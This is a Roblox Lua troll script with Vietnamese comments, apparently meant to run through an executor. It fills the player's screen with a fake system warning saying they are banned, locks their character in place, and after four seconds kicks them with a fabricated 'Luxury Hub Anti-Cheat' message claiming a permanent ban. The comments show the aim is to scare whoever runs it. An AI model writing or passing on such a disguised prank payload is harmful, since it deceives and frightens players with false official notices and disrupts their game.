local Players = game:GetService("Players")
local LP = Players.LocalPlayer

-- Tạo bảng UI hù dọa chiếm trọn màn hình
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TrollBanHub"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.CoreGui

-- Khung nền đen che kín/chặn toàn màn hình
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(1, 0, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MainFrame.BackgroundTransparency = 0.2
MainFrame.Active = true
MainFrame.Draggable = false -- Cố định không cho kéo đi đâu hết
MainFrame.Parent = ScreenGui

-- Bảng thông báo chính giữa
local AlertBox = Instance.new("Frame")
AlertBox.Size = UDim2.new(0, 450, 0, 220)
AlertBox.Position = UDim2.new(0.5, -225, 0.5, -110)
AlertBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
AlertBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
AlertBox.BorderSizePixel = 3
AlertBox.Parent = MainFrame

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = AlertBox

-- Dòng chữ thông báo chí mạng
local TextLabel = Instance.new("TextLabel")
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Position = UDim2.new(0, 0, 0, 0)
TextLabel.BackgroundTransparency = 1
TextLabel.Text = "⚠️ CẢNH BÁO HỆ THỐNG ⚠️\n\nBẠN ĐÃ BỊ CẤM KHỎI SCRIPT\n[ By @Chuong_Luxury ]"
TextLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.TextSize = 22
TextLabel.TextWrapped = true
TextLabel.Parent = AlertBox

-- Khóa cứng nhân vật tại chỗ, không cho di chuyển hay tương tác
task.spawn(function()
    while task.wait(0.1) do
        pcall(function()
            if LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
                LP.Character:FindFirstChildOfClass("Humanoid").PlatformStand = true
            end
        end)
    end
end)

-- Sau 4 giây hiển thị bảng hù dọa thì đá (Kick) thẳng ra khỏi server game
task.delay(4, function()
    pcall(function()
        LP:Kick("\n[Luxury Hub Anti-Cheat]\nBạn đã bị cấm vĩnh viễn khỏi máy chủ do vi phạm hệ thống!")
    end)
end)
